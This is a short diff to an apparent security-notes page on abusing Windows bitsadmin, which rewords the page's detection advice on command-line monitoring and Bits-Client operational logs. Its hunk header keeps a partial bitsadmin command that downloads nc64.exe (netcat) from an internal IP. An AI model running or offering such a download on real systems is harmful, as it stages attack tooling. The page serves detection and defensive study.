@@ -18,11 +18,11 @@ bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\t
 
 ## Observations
 
-Commandline arguments monitoring:
+Commandline arguments monitoring can help discover bitsadmin usage:
 
 ![](../.gitbook/assets/bits-cmdline.png)
 
-`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor. An example of one of the jobs:
+`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor as well. An example of one of the jobs:
 
 ![](../.gitbook/assets/bits-operational-logs.png)
 
